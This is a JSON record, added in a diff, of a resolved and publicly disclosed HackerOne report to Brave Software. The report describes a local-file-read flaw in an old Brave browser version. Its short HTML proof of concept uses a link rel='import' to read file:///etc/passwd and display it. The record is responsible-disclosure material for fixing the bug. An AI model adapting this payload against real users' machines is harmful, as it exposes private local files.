@@ -1,0 +1,136 @@
+{
+  "id": 375329,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzUzMjk=",
+  "url": "https://hackerone.com/reports/375329",
+  "title": "Local files reading using `link[rel=\"import\"]`",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-02T12:25:56.922Z",
+  "submitted_at": "2018-07-02T12:25:56.922Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "metnew",
+    "url": "/metnew",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jdthvavflc07lpt5x37qarrub1jt/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15688,
+    "url": "https://hackerone.com/brave",
+    "handle": "brave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Brave Software",
+      "twitter_handle": "brave",
+      "website": "https://brave.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-09-29T00:16:24.191Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-21T20:12:07.628Z",
+  "team_member_agreed_on_going_public_at": "2018-09-29T00:16:24.130Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nHTML file could import another file using `<link rel=\"import\">`.  Brave returns `Access-Control-Allow-Origin: *` response header for local HTML files. That leads to local files reading.\n\n> This vulnerability makes #369218 critical.\n\n## Products affected: \n\nBrave: 0.23.19 \nV8: 6.7.288.46 \nrev: 178c3fbc045a0cbdbe098db08307503cce952081 \nMuon: 7.1.3 \nOS Release: 17.6.0 \nUpdate Channel: Release \nOS Architecture: x64 \nOS Platform: macOS \nNode.js: 7.9.0 \nBrave Sync: v1.4.2 \nlibchromiumcontent: 67.0.3396.87\n\n## Steps To Reproduce:\n\nPoC:\n``` html\n<head>\n    <script>\n        function show() {\n            var file = link.import.querySelector('body')\n            alert(file.innerHTML)\n        }\n    </script>\n    <link id=\"link\" href=\"file:///etc/passwd\" rel=\"import\" as=\"document\" onload=\"show()\" />\n</head>\n```\n\n## Supporting Material/References:\n\nScreencast + PoC attached.\n\n## Impact\n\nLocal files reading is forbidden in any browser.\nAlso, note that this vulnerability makes  #369218 critical.\n\n> Probably all platforms(macOS/Win/Linux) are affected.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 314554,
+      "file_name": "brave-read-local-files.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/314/554/03cb98cfd91fd4d5264ec29231f3aa72695dfacd/brave-read-local-files.mp4?response-content-disposition=attachment%3B%20filename%3D%22brave-read-local-files.mp4%22%3B%20filename%2A%3DUTF-8%27%27brave-read-local-files.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7DU5GKF4%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152338Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCrQKyduZZSWpEa7lQMN1p4%2Fg3sVJGOZNwC3ZYR7%2BzycQIgbO5CkantWicBlLfZ3bxbC0XlhZro4xbuhPuDBKRdVAIqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBSQe56SuRqu2QVvTyqOBT4i9V77BanEH%2FGYmI11rEM55QdB3rIobpS5%2FjxyyMXKITycwIp%2B4ayHD3XZB4N%2FYY49mJGMUJzAIMHJdrEDZj%2FtME%2FiqdZBBHabD9xJ69%2FS9GPJWJBsaxSE3yEpRpnG3rXLoGIaI0IpS6%2B6VxL6tAG%2FmgR5wAXTpSRbQZbB938sNkSHfVWqCjL9HqTAfYobL%2BNM3yS09eA0f4Lqk0pJq8BuOZCmC2%2FweM1ZRosbQhGb8x%2B4F2XrzQHTXQXx8uFhr9hAL%2BrZ%2FMMZgX52azruzAaMMyLX9rkdwZDGYVvn3xmHKjxD%2F%2FAGiQcSFG2Vr941ofF%2B6%2BPHu%2BjJQMYvEk9R7QUCi43JpR1GcFdql%2BfMFAtu%2FitFOfBHcrR4gHixnRAfqDCOeM7MpPeq44t%2FirIITaflUg%2BdX2d7vqC%2B8tl%2FYPVE35IQpjB5REdOuOAHweGkZiaEHdxOBhdujXn5I3Ubnm2vq2%2FvhukewEaBlWBjW%2BVKjTOg7qCyQE7JZWj0RNKFiIsBnwfzKoJPy9rmhIOnShe%2FG92%2B83U2Ya3u0fTl4XugNh9Yrgp%2FRrBd1rxfcrUnZhgkRvOmzXw%2BAI2Tt9jukZQsLFrC5g0O0jljRuOut8hkMVojkBSFrk4MghR6rdPiCZsCua%2FcELUNkLX2VR6WSopllx95eh%2B9oGGVM%2Fc9mFoxlGj871FZOjKC%2BbupQtxkkYth1pePLoR2ElI0MQ2RlXgQLpZEmEhjObLpoRGcw787NHxHAgqKl1gN3Fj2ln1QHnkOWbJSP%2BpZs7jxZ9Zwy9mJ4pXvXn0zjaP%2FA7%2FUIBDCNb9QZdlzTYVklK9xEilmqIsjym9sJEMiBcYxHh8jEYH4wZgKHxRkkPHsgqEu%2FzDKi%2F3PBjqxASuspeEpRMQxbEopnX438NIm1UM1ErK9dmrje6ul%2BxExALlTvNbEkds3MRmm5Eszvbcmdq%2BRr0gS91HN4yDOxTHDmKrK7NaYJhXou1ldxYpcLWytN88C9p0a5T54OwwGn8WbTqxnn8vQLOoBENn8QVq40Bp0gB5kTAZfQYO0k3Wu3IVbRBH%2F%2BLCCRFyoaHdInJIaPAmx2Hx7bW4kebRsQGm4qOZkPOe4pfAiF91I3MlHiQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f7f8445e032a6db7d4dc4678cc2b08e3ac925274dbdd4029e1da61069011384f",
+      "file_size": 311071,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 314555,
+      "file_name": "exploit.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/314/555/2324d6d2248486741d263f7c4dcd7ecf3fcf58e3/exploit.html?response-content-disposition=attachment%3B%20filename%3D%22exploit.html%22%3B%20filename%2A%3DUTF-8%27%27exploit.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7DU5GKF4%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152338Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCrQKyduZZSWpEa7lQMN1p4%2Fg3sVJGOZNwC3ZYR7%2BzycQIgbO5CkantWicBlLfZ3bxbC0XlhZro4xbuhPuDBKRdVAIqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBSQe56SuRqu2QVvTyqOBT4i9V77BanEH%2FGYmI11rEM55QdB3rIobpS5%2FjxyyMXKITycwIp%2B4ayHD3XZB4N%2FYY49mJGMUJzAIMHJdrEDZj%2FtME%2FiqdZBBHabD9xJ69%2FS9GPJWJBsaxSE3yEpRpnG3rXLoGIaI0IpS6%2B6VxL6tAG%2FmgR5wAXTpSRbQZbB938sNkSHfVWqCjL9HqTAfYobL%2BNM3yS09eA0f4Lqk0pJq8BuOZCmC2%2FweM1ZRosbQhGb8x%2B4F2XrzQHTXQXx8uFhr9hAL%2BrZ%2FMMZgX52azruzAaMMyLX9rkdwZDGYVvn3xmHKjxD%2F%2FAGiQcSFG2Vr941ofF%2B6%2BPHu%2BjJQMYvEk9R7QUCi43JpR1GcFdql%2BfMFAtu%2FitFOfBHcrR4gHixnRAfqDCOeM7MpPeq44t%2FirIITaflUg%2BdX2d7vqC%2B8tl%2FYPVE35IQpjB5REdOuOAHweGkZiaEHdxOBhdujXn5I3Ubnm2vq2%2FvhukewEaBlWBjW%2BVKjTOg7qCyQE7JZWj0RNKFiIsBnwfzKoJPy9rmhIOnShe%2FG92%2B83U2Ya3u0fTl4XugNh9Yrgp%2FRrBd1rxfcrUnZhgkRvOmzXw%2BAI2Tt9jukZQsLFrC5g0O0jljRuOut8hkMVojkBSFrk4MghR6rdPiCZsCua%2FcELUNkLX2VR6WSopllx95eh%2B9oGGVM%2Fc9mFoxlGj871FZOjKC%2BbupQtxkkYth1pePLoR2ElI0MQ2RlXgQLpZEmEhjObLpoRGcw787NHxHAgqKl1gN3Fj2ln1QHnkOWbJSP%2BpZs7jxZ9Zwy9mJ4pXvXn0zjaP%2FA7%2FUIBDCNb9QZdlzTYVklK9xEilmqIsjym9sJEMiBcYxHh8jEYH4wZgKHxRkkPHsgqEu%2FzDKi%2F3PBjqxASuspeEpRMQxbEopnX438NIm1UM1ErK9dmrje6ul%2BxExALlTvNbEkds3MRmm5Eszvbcmdq%2BRr0gS91HN4yDOxTHDmKrK7NaYJhXou1ldxYpcLWytN88C9p0a5T54OwwGn8WbTqxnn8vQLOoBENn8QVq40Bp0gB5kTAZfQYO0k3Wu3IVbRBH%2F%2BLCCRFyoaHdInJIaPAmx2Hx7bW4kebRsQGm4qOZkPOe4pfAiF91I3MlHiQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1893a830ea27dba9e5742c713e5c557934b7efcd14f30dea7512248cb5f0bae5",
+      "file_size": 260,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 43,
+  "voters": [
+    "otuken",
+    "muon4",
+    "ali",
+    "sameerphad72",
+    "metnew",
+    "savitar0x01",
+    "ahiezer",
+    "apapedulimu",
+    "eveeez",
+    "kieran",
+    "and 33 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 7933,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/brave/browser-laptop",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
